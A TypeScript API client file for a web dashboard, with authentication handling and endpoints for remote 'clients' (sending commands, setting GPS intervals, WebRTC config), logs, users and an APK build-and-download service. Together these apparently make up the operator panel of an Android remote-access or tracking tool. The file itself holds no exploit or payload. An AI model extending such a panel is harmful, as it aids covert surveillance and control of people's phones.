import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  timeout: 30000,
  withCredentials: true,
});

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('auth-token');
  const isFormData = config.data instanceof FormData;

  config.headers = config.headers || {};
  if (!isFormData) {
    config.headers['Content-Type'] = 'application/json';
  } else {
    delete (config.headers as Record<string, unknown>)['Content-Type'];
  }

  if (token && !config.headers?.Authorization) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

const AUTH_WHITELIST = ['/api/auth/login'];
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error?.response?.status === 401) {
      const url: string = error.config?.url || '';
      const isAuthEndpoint = AUTH_WHITELIST.some(ep => url === ep || url.endsWith(ep));
      if (!isAuthEndpoint) {
        // Probe /api/auth/me with credentials (cookies) and optional token header to
        // distinguish between a truly expired session and a transient 401 from the
        // backend. Timeout quickly to avoid hangs.
        try {
          const tokenForProbe = (() => { try { return localStorage.getItem('auth-token'); } catch { return null; } })();
          const probeHeaders: Record<string, string> = {};
          if (tokenForProbe) probeHeaders['Authorization'] = `Bearer ${tokenForProbe}`;
          const controller = new AbortController();
          const id = setTimeout(() => controller.abort(), 3000);
          const probe = await fetch('/api/auth/me', { method: 'GET', credentials: 'include', headers: probeHeaders as any, signal: controller.signal });
          clearTimeout(id);
          if (probe && probe.ok) {
            // Session still valid (cookie or token); do not force logout on single 401.
            return Promise.reject(error);
          }
        } catch (e) {
          // probe failed or timed out — fall through to clear session
        }

        try {
          localStorage.removeItem('auth-user');
          localStorage.removeItem('auth-token');
        } catch (e) {
          // ignore
        }
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
    }
    return Promise.reject(error);
  }
);


export default api;

export const authApi = {
  login: (username: string, password: string, bindingKey?: string) => api.post('/auth/login', { username, password, bindingKey }),
  logout: () => api.post('/auth/logout'),
  me: () => api.get('/auth/me'),
  changePassword: (currentPassword: string, newPassword: string) => api.post('/auth/change-password', { currentPassword, newPassword }),
  updateProfile: (data: { username?: string; email?: string }) => api.post('/auth/update-profile', data),
};

export const dashboardApi = { getData: (config?: { signal?: AbortSignal }) => api.get('/dashboard', config) };

export const clientsApi = {
  getAll: () => api.get('/clients'),
  getOne: (id: string) => api.get(`/client/${id}`),
  getPage: (id: string, page: string) => api.get(`/client/${id}/${page}`),
  getWebRtcConfig: (id: string) => api.get(`/client/${id}/webrtc-config`),
  delete: (id: string) => api.delete(`/client/${id}`),
  rotateCredential: (id: string) => api.post(`/client/${id}/credential/rotate`),
  revokeCredential: (id: string) => api.post(`/client/${id}/credential/revoke`),
  sendCommand: (id: string, cmd: string, params?: Record<string, unknown>) => api.post(`/cmd/${id}/${cmd}`, params || {}),
  setGps: (id: string, interval: number) => api.post(`/gps/${id}/${interval}`),
  // Set or clear owner: { ownerId: number | null }
  setOwner: (id: string, ownerId: number | null) => api.post(`/client/${id}/owner`, { ownerId }),
};

export const logsApi = {
  getLogs: (params?: { type?: string; category?: string; search?: string; limit?: number }) => api.get('/logs', { params }),
  getStats: () => api.get('/logs/stats'),
  clear: () => api.post('/logs/clear'),
};

export const builderApi = {
  build: (formData: FormData) => api.post('/builder/build', formData, { timeout: 600000 }),
  // legacy global cancel (cancels currently running build)
  cancelBuild: () => api.post('/builder/cancel'),
  // per-job control endpoints
  cancelJob: (id: number) => api.post(`/builder/job/${id}/cancel`),
  retryJob: (id: number) => api.post(`/builder/job/${id}/retry`),
  downloadApk: (onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get('/builder/download', { responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
  // New: list jobs and download by job id
  getJobs: () => api.get('/builder/jobs'),
  getJob: (id: number) => api.get(`/builder/job/${id}`),
  downloadApkById: (id: number, onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get(`/builder/download/${id}`, { responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
  // Logs
  getJobLog: (id: number, params?: { lines?: number; format?: 'text' | 'json' }) => api.get(`/builder/job/${id}/log`, { params }),
  downloadJobLog: (id: number, onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get(`/builder/job/${id}/log`, { params: { download: 1 }, responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
};

export const usersApi = {
  getAll: () => api.get('/users'),
  search: (q: string) => api.get('/users', { params: { q } }),
  create: (data: { username: string; email: string; password: string; role: string; permissions?: string[]; generateBinding?: boolean }) => api.post('/users', data),
  update: (id: number, data: { username?: string; email?: string; role?: string; permissions?: string[] }) => api.put(`/users/${id}`, data),
  updatePermissions: (id: number, permissions: string[]) => api.put(`/users/${id}/permissions`, { permissions }),
  getPermissionsSchema: () => api.get('/users/permissions-schema'),
  resetPassword: (id: number, password: string) => api.put(`/users/${id}/password`, { password }),
  delete: (id: number) => api.delete(`/users/${id}`),
  rotateBinding: (id: number) => api.post(`/users/${id}/binding/rotate`),
  revokeBinding: (id: number) => api.post(`/users/${id}/binding/revoke`),
};
